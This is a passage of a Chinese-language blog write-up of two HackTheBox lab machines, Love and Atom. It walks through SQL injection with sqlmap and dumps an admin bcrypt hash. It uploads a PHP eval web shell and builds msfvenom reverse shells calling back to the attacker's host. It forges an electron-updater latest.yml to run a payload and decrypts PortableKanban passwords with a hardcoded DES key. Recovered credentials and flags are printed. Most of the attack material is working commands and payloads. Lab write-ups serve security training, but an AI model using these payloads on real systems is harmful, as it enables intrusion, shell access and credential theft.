open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (95%), Microsoft Windows Longhorn (95%), Microsoft Windows 10 1703 (93%), Microsoft Windows Server 2008 R2 (93%), Microsoft Windows 7 SP1 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows 10 1709 - 1803 (93%), Microsoft Windows 10 1809 - 1909 (93%), Microsoft Windows 10 1511 (92%), Microsoft Windows Server 2008 SP2 (92%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Hosts: www.example.com, www.love.htb</span><br></pre></td></tr></table></figure><p>这里需要对SSL端口进行更加详细的扫描才能得到域名<code>staging.love.htb</code><br />不使用域名访问443端口则会被403<br />5000端口则是直接403</p><h2 id="漏洞利用-3"><a class="markdownIt-Anchor" href="#漏洞利用-3"></a> 漏洞利用</h2><p>用域名访问443端口可以看到一个LFI漏洞<br />file协议读取即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#C:\xampp\htdocs\omrs\login.php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;includes/conn.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$voter</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;voter&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM voters WHERE voters_id = &#x27;<span class="subst">$voter</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$query</span>-&gt;num_rows &lt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Cannot find voter with the ID&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$query</span>-&gt;fetch_assoc();</span><br><span class="line"><span class="keyword">if</span>(password_verify(<span class="variable">$password</span>, <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;voter&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Incorrect password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Input voter credentials first&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;location: index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#C:\xampp\htdocs\omrs\admin\includes\conn.php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;votesystem&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#C:\xampp\htdocs\omrs\admin\login.php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;includes/conn.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$query</span>-&gt;num_rows &lt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Cannot find account with the username&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$query</span>-&gt;fetch_assoc();</span><br><span class="line"><span class="keyword">if</span>(password_verify(<span class="variable">$password</span>, <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Incorrect password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Input admin credentials first&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;location: index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#C:\xampp\htdocs\omrs\admin\includes\conn.php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;votesystem&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>明显地存在SQL注入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/login.php&quot;</span> -data <span class="string">&quot;voter=123&amp;password=321&amp;login=&quot;</span> --dbs</span><br><span class="line">available databases [6]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] phpmyadmin</span><br><span class="line">[*] <span class="built_in">test</span></span><br><span class="line">[*] votesystem</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem --tables</span><br><span class="line">Database: votesystem</span><br><span class="line">[5 tables]</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">| candidates |</span><br><span class="line">| positions  |</span><br><span class="line">| voters     |</span><br><span class="line">| votes      |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T admin --columns</span><br><span class="line">Database: votesystem</span><br><span class="line">Table: admin</span><br><span class="line">[7 columns]</span><br><span class="line">+------------+--------------+</span><br><span class="line">| Column     | Type         |</span><br><span class="line">+------------+--------------+</span><br><span class="line">| created_on | date         |</span><br><span class="line">| firstname  | varchar(50)  |</span><br><span class="line">| id         | int(11)      |</span><br><span class="line">| lastname   | varchar(50)  |</span><br><span class="line">| password   | varchar(60)  |</span><br><span class="line">| photo      | varchar(150) |</span><br><span class="line">| username   | varchar(50)  |</span><br><span class="line">+------------+--------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T admin -C username, password --dump</span><br><span class="line">Database: votesystem</span><br><span class="line">Table: admin</span><br><span class="line">[1 entry]</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| username | password                                                     |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| admin    | $2y$10<span class="variable">$4E3VVe2PWlTMejquTmMD6</span>.Og9RmmFN.K5A1n99kHNdQxHePutFjsC |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T voters --columns</span><br><span class="line">Database: votesystem</span><br><span class="line">Table: voters</span><br><span class="line">[6 columns]</span><br><span class="line">+-----------+--------------+</span><br><span class="line">| Column    | Type         |</span><br><span class="line">+-----------+--------------+</span><br><span class="line">| firstname | varchar(30)  |</span><br><span class="line">| id        | int(11)      |</span><br><span class="line">| lastname  | varchar(30)  |</span><br><span class="line">| password  | varchar(60)  |</span><br><span class="line">| photo     | varchar(150) |</span><br><span class="line">| voters_id | varchar(15)  |</span><br><span class="line">+-----------+--------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T voters -C voters_id, password --dump</span><br><span class="line">+-----------+----------+</span><br><span class="line">| voters_id | password |</span><br><span class="line">+-----------+----------+</span><br><span class="line">+-----------+----------+</span><br></pre></td></tr></table></figure><p>然而这里Hash爆破速度过慢, Bcrypt的运算复杂程度远高于md5</p><p><s>看了眼别人WP</s><br />用443端口的功能访问本地5000得到登入凭证<br /><code>admin:@LoveIsInTheAir!!!!</code><br /><s>一直用渗透的常规思路打这台靶机, 没想到整这么一出</s><br />登入后台后上传Shell</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/voters_add.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.10.10.239</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------7586397232801671174932942436</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>696</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://10.10.10.239</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://10.10.10.239/admin/voters.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=uofg65u57tbm4rp6jbn0359660</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;firstname&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;lastname&quot;</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;</span><br><span class="line"></span><br><span class="line">333</span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;add&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------7586397232801671174932942436--</span><br></pre></td></tr></table></figure><p>蚁剑上传nc反弹shell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\phoebe\desktop\user.txt</span><br><span class="line">fc8833cab6af6700441328fd2a4ecc04</span><br></pre></td></tr></table></figure><h2 id="权限提升-3"><a class="markdownIt-Anchor" href="#权限提升-3"></a> 权限提升</h2><blockquote><p>找到alwaysinstallelevated，即当注册表中的alwaysinstallelevated设置为1时，机器上运行任何的msi程序，均会以system权限执行，我们只需生成一个msi的木马程序即可提权。<br /><a href="https://zhuanlan.zhihu.com/p/375373404">https://zhuanlan.zhihu.com/p/375373404</a></p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    0x1</span><br><span class="line"></span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    0x1</span><br></pre></td></tr></table></figure><p>msfvenom生成一个Shell即可</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line">a0f54f7853efdefe4c8cef97186db4c8</span><br></pre></td></tr></table></figure><blockquote><p>msfvenom &amp; nc</p></blockquote><p>本着能不用MSF就不用了MSF的原则<br />没有使用meterpreter<br />但是发现有(staged)标识还是不能用nc直接接收Shell的<br />最后用<code>windows/x64/shell/reverse_tcp</code></p><hr /><h1 id="hackthebox_atom"><a class="markdownIt-Anchor" href="#hackthebox_atom"></a> HackTheBox_Atom</h1><h2 id="端口扫描-4"><a class="markdownIt-Anchor" href="#端口扫描-4"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.237</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.237</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">80/tcp  open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">443/tcp open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-4"><a class="markdownIt-Anchor" href="#漏洞利用-4"></a> 漏洞利用</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.10.10.237</span><br><span class="line"></span><br><span class="line">Sharename       Type      Comment</span><br><span class="line">---------       ----      -------</span><br><span class="line">ADMIN$          Disk      Remote Admin</span><br><span class="line">C$              Disk      Default share</span><br><span class="line">IPC$            IPC       Remote IPC</span><br><span class="line">Software_Updates Disk      </span><br><span class="line">SMB1 disabled -- no workgroup available</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.10.10.237\\software_updates</span><br><span class="line"></span><br><span class="line">smb: \&gt; dir</span><br><span class="line">  .                                   D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  ..                                  D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  client1                             D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  client3                             D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 19:18:08 2021</span><br><span class="line">4413951 blocks of size 4096. 1381036 blocks available</span><br><span class="line">smb: \&gt; get UAT_Testing_Procedures.pdf</span><br><span class="line">getting file \UAT_Testing_Procedures.pdf of size 35202 as UAT_Testing_Procedures.pdf (6.3 KiloBytes/sec) (average 6.3 KiloBytes/sec)</span><br></pre></td></tr></table></figure><blockquote><p>Note taking application built with electron-builder which helps users in taking important<br />notes.</p></blockquote><p><code>electron-builder</code>可以在google上搜到一个RCE漏洞</p><blockquote><p><a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a></p></blockquote><p>构造payload</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=9996 -f exe &gt; s\<span class="string">&#x27;hell.exe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cat latest.yml</span></span><br><span class="line"><span class="string">version: 1.2.3</span></span><br><span class="line"><span class="string">path: http://10.10.16.3:9999/s&#x27;</span>hell.exe</span><br><span class="line">sha512: pyfnrQs40RwrwKOWykgeZ0PKeSudGkN1UI/9j+PpxG4M42uY88j/hNAx7xWonk57X0GMdPIOma9FsfeBglTLMQ==</span><br></pre></td></tr></table></figure><p>开启HTTP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9999</span><br></pre></td></tr></table></figure><p>将<code>latest.yml</code>上传至<code>client*</code>文件夹中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\jason\desktop\user.txt</span><br><span class="line">3eda0e1bce259d8ffd4c1994f84bfdea</span><br></pre></td></tr></table></figure><h2 id="权限提升-4"><a class="markdownIt-Anchor" href="#权限提升-4"></a> 权限提升</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\&quot;program files<span class="string">&quot;\redis\redis.windows.conf</span></span><br><span class="line"><span class="string">requirepass kidvscat_yes_kidvscat</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.10.10.237 -a kidvscat_yes_kidvscat</span><br><span class="line"></span><br><span class="line">keys *</span><br><span class="line">1) <span class="string">&quot;pk:ids:User&quot;</span></span><br><span class="line">2) <span class="string">&quot;pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0&quot;</span></span><br><span class="line">3) <span class="string">&quot;pk:ids:MetaDataClass&quot;</span></span><br><span class="line">4) <span class="string">&quot;pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff&quot;</span></span><br><span class="line"></span><br><span class="line">get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0</span><br><span class="line"><span class="string">&quot;&#123;\&quot;Id\&quot;:\&quot;e8e29158d70d44b1a1ba4949d52790a0\&quot;,\&quot;Name\&quot;:\&quot;Administrator\&quot;,\&quot;Initials\&quot;:\&quot;\&quot;,\&quot;Email\&quot;:\&quot;\&quot;,\&quot;EncryptedPassword\&quot;:\&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\&quot;,\&quot;Role\&quot;:\&quot;Admin\&quot;,\&quot;Inactive\&quot;:false,\&quot;TimeStamp\&quot;:637530169606440253&#125;&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir c:\users\jason\downloads\</span><br><span class="line"></span><br><span class="line">d-----          4/2/2021   8:21 PM                PortableKanban</span><br></pre></td></tr></table></figure><p>存在一个密码恢复的漏洞</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> des <span class="keyword">import</span> * <span class="comment"># python3 -m pip install des</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line"><span class="built_in">hash</span> = base64.b64decode(<span class="built_in">hash</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">key = DesKey(<span class="string">b&quot;7ly6UznJ&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> key.decrypt(<span class="built_in">hash</span>,initial=<span class="string">b&quot;XuVUm5fR&quot;</span>,padding=<span class="literal">True</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(decode(<span class="string">&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&quot;</span>))</span><br></pre></td></tr></table></figure><p>得到<code>kidvscat_admin_@123</code></p><p>evil-rm登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span 